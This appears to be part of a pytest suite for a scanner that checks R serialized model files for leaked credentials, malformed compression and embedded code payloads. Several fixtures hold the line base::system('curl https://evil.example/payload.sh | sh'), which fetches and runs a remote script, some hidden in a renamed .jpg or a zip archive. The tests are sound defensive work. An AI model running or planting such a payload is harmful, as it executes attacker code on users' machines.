    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "UNTERMINATED_QUOTED_SECRET" not in sample
    assert sample.endswith("token <- <redacted>")


def test_scan_detects_long_rightward_raw_credential_identifier(tmp_path: Path) -> None:
    path = tmp_path / "long-rightward-raw-assignment.rds"
    long_identifier = f"service_{'a' * 300}_token"
    _write_raw_r_serialized(
        path,
        f'expression\nlanguage\nbase::system("curl"); r"(LONG_RIGHTWARD_RAW_SECRET)" -> {long_identifier}',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "LONG_RIGHTWARD_RAW_SECRET" not in sample
    assert sample.startswith('base::system("curl"); <redacted> -> service_')


def test_scan_allows_benign_r_assignment_key_near_matches(tmp_path: Path) -> None:
    path = tmp_path / "benign-native-assignments.rds"
    _write_raw_r_serialized(
        path,
        "monkey <- 'BENIGN_VALUE'; tokenizer <- 'BENIGN_VALUE'; `not-a-tokenizer` <- 'BENIGN_VALUE'; "
        "`not a tokenizer` <- 'BENIGN_VALUE'; signature <- 'gaussian'; credential <- 'standard'; "
        "sas <- 'dataset-value'; sig <- 'benign-value'; token.count <- 'BENIGN_VALUE'; "
        "api.keyboard <- 'BENIGN_VALUE'; `not.a.tokenizer` <- 'BENIGN_VALUE'; "
        '"tokenizer" <- "BENIGN_VALUE"; "not a tokenizer" <- "BENIGN_VALUE"; '
        "tokenizer[1] <- 'BENIGN_VALUE'; config$tokenizer <- 'BENIGN_VALUE'; "
        'config[["tokenizer"]] <- "BENIGN_VALUE"',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED


def test_scan_allows_benign_json_credential_key_metadata(tmp_path: Path) -> None:
    path = tmp_path / "benign-json-metadata.rds"
    _write_raw_r_serialized(
        path,
        '{"token": "standard", "client.secret": "metadata"}',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED


@pytest.mark.parametrize(
    "metadata",
    [
        'r"(example: "NOT_A_SECRET" -> token)"',
        "'\"NOT_A_SECRET\" -> token'",
        '# "NOT_A_SECRET" -> token',
        'token: "NOT_A_SECRET"',
        'token: r"(NOT_A_SECRET)"',
        '# token <- r"(NOT_A_SECRET)"',
        '# r"(NOT_A_SECRET)" -> token',
        "'token <- r\"(NOT_A_SECRET)\"'",
        '# r"{BROKEN; token <- r"(NOT_A_SECRET)"',
        '\'r"{BROKEN; token <- r"(NOT_A_SECRET)"\'',
        'list(token = "standard")',
        'list(token = r"(standard)")',
        'function(token = "standard") NULL',
        'function(token = r"(standard)") NULL',
        ') list(token = "standard")',
        '] list(token = r"(standard)")',
        '} function(token = paste0("stan", "dard")) NULL',
        'base::list(token = "standard")',
        '`list`(token = r"(standard)")',
        '\\(token = "standard") NULL',
        'x[token = "standard"]',
        'x[[token = r"(standard)"]]',
    ],
)
def test_scan_allows_assignment_examples_inside_benign_metadata(tmp_path: Path, metadata: str) -> None:
    path = tmp_path / "benign-assignment-example.rds"
    _write_raw_r_serialized(path, metadata)

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED


@pytest.mark.parametrize(
    "assignment",
    [
        '( token = "UNMATCHED_PAREN_SECRET"',
        '[ token = "UNMATCHED_BRACKET_SECRET"',
        '( token = r"(UNMATCHED_RAW_PAREN_SECRET)"',
        '[ token = r"(UNMATCHED_RAW_BRACKET_SECRET)"',
        '(] token = "MISMATCHED_PAREN_SECRET")',
        '[) token = r"(MISMATCHED_RAW_BRACKET_SECRET)"]',
    ],
)
def test_scan_unmatched_delimiters_do_not_hide_equal_assignments(tmp_path: Path, assignment: str) -> None:
    path = tmp_path / "unmatched-delimiter-credential.rds"
    _write_raw_r_serialized(path, assignment)

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED


@pytest.mark.parametrize(
    "assignment",
    [
        '(token = "GROUPED_QUOTED_SECRET")',
        '(token = r"(GROUPED_RAW_SECRET)")',
        '(token = paste0("GROUPED_", "EXPRESSION_SECRET"))',
        'if (token = "CONDITION_SECRET") TRUE',
        'list((token = "NESTED_GROUP_SECRET"))',
        ') (token = "STRAY_CLOSER_SECRET")',
        '1(token = r"(NUMERIC_PREFIX_SECRET)")',
        'if (TRUE) (token = "CONTROL_BODY_SECRET")',
        'function() (token = r"(FUNCTION_BODY_SECRET)")',
        '[token = "STANDALONE_BRACKET_SECRET"]',
        '[[token = r"(STANDALONE_DOUBLE_BRACKET_SECRET)"]]',
    ],
)
def test_scan_grouped_equal_assignments_are_detected(tmp_path: Path, assignment: str) -> None:
    path = tmp_path / "grouped-credential-assignment.rds"
    _write_raw_r_serialized(path, assignment)

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED


def test_scan_doc_heavy_content_with_risky_words_is_not_critical(tmp_path: Path) -> None:
    path = tmp_path / "docs_only.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "# documentation: this model report mentions system and eval terms",
                "# description: parse values for evaluation tables only",
                "# comment: no function invocation should run",
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert critical_checks == []

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.PASSED


def test_scan_corrupt_gzip_stream_is_handled_fail_closed(tmp_path: Path) -> None:
    path = tmp_path / "corrupt.rds"
    path.write_bytes(b"\x1f\x8b\x08\x00\x00\x00")

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "r_serialized_decode_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "operational_error" not in result.metadata
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.FAILED


def test_scan_xz_memory_limited_stream_is_handled_fail_closed(tmp_path: Path) -> None:
    path = tmp_path / "memlimit.rds"
    _write_xz_r_serialized(path, "safe", dict_size=1 << 24)

    assert RSerializedScanner.can_handle(str(path))
    scanner = RSerializedScanner(config={"r_max_decompressed_bytes": 1024})
    result = scanner.scan(str(path))

    assert result.success is False
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.FAILED


def test_scan_benign_xz_stream_passes_decompression_checks(tmp_path: Path) -> None:
    path = tmp_path / "safe-xz.rds"
    _write_xz_r_serialized(path, "safe\nmodel\nweights", dict_size=1 << 24)

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is True
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.PASSED


def test_scan_truncated_xz_stream_is_handled_fail_closed(tmp_path: Path) -> None:
    path = tmp_path / "truncated-xz.rds"
    _write_xz_r_serialized(path, "safe\nmodel\nweights", dict_size=1 << 20)
    path.write_bytes(path.read_bytes()[:-16])

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is False
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.FAILED


def test_scan_concatenated_xz_streams_preserve_later_malicious_payloads(tmp_path: Path) -> None:
    path = tmp_path / "concatenated-xz.rds"
    _write_concatenated_xz_r_serialized(
        path,
        [
            "safe\nmodel\nweights",
            "expression\nbase::system('curl https://evil.example/payload.sh | sh')",
        ],
        dict_size=1 << 20,
    )

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is False

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.FAILED
    assert symbol_checks[0].severity == IssueSeverity.CRITICAL

    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    assert payload_checks[0].status == CheckStatus.FAILED
    assert payload_checks[0].severity == IssueSeverity.CRITICAL


def test_large_non_r_xz_payload_is_not_claimed_by_r_scanner(tmp_path: Path) -> None:
    path = tmp_path / "not-r-bomb.rds"
    payload = b"NOT_R_FORMAT\n" + (b"A" * 250_000)
    path.write_bytes(
        lzma.compress(
            payload,
            format=lzma.FORMAT_XZ,
            filters=[{"id": lzma.FILTER_LZMA2, "dict_size": 1 << 20}],
        )
    )

    assert not RSerializedScanner.can_handle(str(path))
    assert get_scanner_for_file(str(path)) is None

    result = core.scan_file(str(path))
    assert result.scanner_name == "unknown"
    assert _check_by_name(result, "R Serialized Decompression") == []


def test_r_serialized_routes_through_detection_and_registry(tmp_path: Path) -> None:
    path = tmp_path / "model.rdata"
    _write_raw_r_serialized(path, "workspace\nmodel", workspace_header=True)

    assert detect_file_format(str(path)) == "r_serialized"
    assert detect_format_from_extension(str(path)) == "r_serialized"

    scanner = get_scanner_for_file(str(path))
    assert scanner is not None
    assert scanner.name == "r_serialized"


def test_core_routes_renamed_r_workspace_and_preserves_malicious_findings(tmp_path: Path) -> None:
    path = tmp_path / "payload.jpg"
    _write_raw_r_serialized(
        path,
        "expression\nlanguage\nbase::system('curl https://evil.example/payload.sh | sh')",
        workspace_header=True,
    )

    direct = core.scan_file(str(path), config={"cache_enabled": False})
    aggregate = core.scan_model_directory_or_file(str(tmp_path), cache_enabled=False, skip_file_types=True)

    assert detect_file_format(str(path)) == "r_serialized"
    assert detect_file_format_for_skip_filter(str(path)) == "r_serialized"
    assert RSerializedScanner.can_handle(str(path))
    assert direct.scanner_name == "r_serialized"
    assert _check_by_name(direct, "Executable Symbol Context Analysis")[0].severity == IssueSeverity.CRITICAL
    assert _check_by_name(direct, "Serialized Expression Payload Detection")[0].severity == IssueSeverity.CRITICAL
    assert core.determine_exit_code(aggregate) == 1
    assert any(issue.location == str(path) and issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)


def test_core_routes_benign_renamed_workspace_without_promoting_weak_raw_near_match(tmp_path: Path) -> None:
    benign_workspace = tmp_path / "benign.jpg"
    _write_raw_r_serialized(benign_workspace, "workspace\nmodel_one\nmodel_two", workspace_header=True)
    ambiguous_text = tmp_path / "notes.jpg"
    ambiguous_text.write_bytes(b"X\nordinary exported table\n")
    incomplete_workspace = tmp_path / "header-notes.jpg"
    incomplete_workspace.write_bytes(b"RDX3\nQ\nordinary exported table\n")

    direct = core.scan_file(str(benign_workspace), config={"cache_enabled": False})
    aggregate = core.scan_model_directory_or_file(str(tmp_path), cache_enabled=False, skip_file_types=True)

    assert direct.scanner_name == "r_serialized"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in direct.issues)
    assert detect_file_format_for_skip_filter(str(ambiguous_text)) == "unknown"
    assert str(ambiguous_text) not in aggregate.file_metadata
    assert detect_file_format_for_skip_filter(str(incomplete_workspace)) == "unknown"
    assert str(incomplete_workspace) not in aggregate.file_metadata
    assert core.determine_exit_code(aggregate) == 0


def test_archive_routes_renamed_r_workspace_without_promoting_weak_raw_near_match(tmp_path: Path) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr(
            "payload.jpg",
            b"RDX3\nX\nexpression\nlanguage\nbase::system('curl https://evil.example/payload.sh | sh')",
        )
        archive.writestr("notes.jpg", b"X\nordinary exported table\n")
        archive.writestr("header-notes.jpg", b"RDX3\nQ\nordinary exported table\n")

    result = core.scan_file(str(archive_path), config={"cache_enabled": False})

    assert result.scanner_name == "zip"
    assert any(
        issue.severity == IssueSeverity.CRITICAL and "payload.jpg" in (issue.location or "") for issue in result.issues
    )
    assert not any("notes.jpg" in (issue.location or "") for issue in result.issues)
    assert not any("header-notes.jpg" in (issue.location or "") for issue in result.issues)
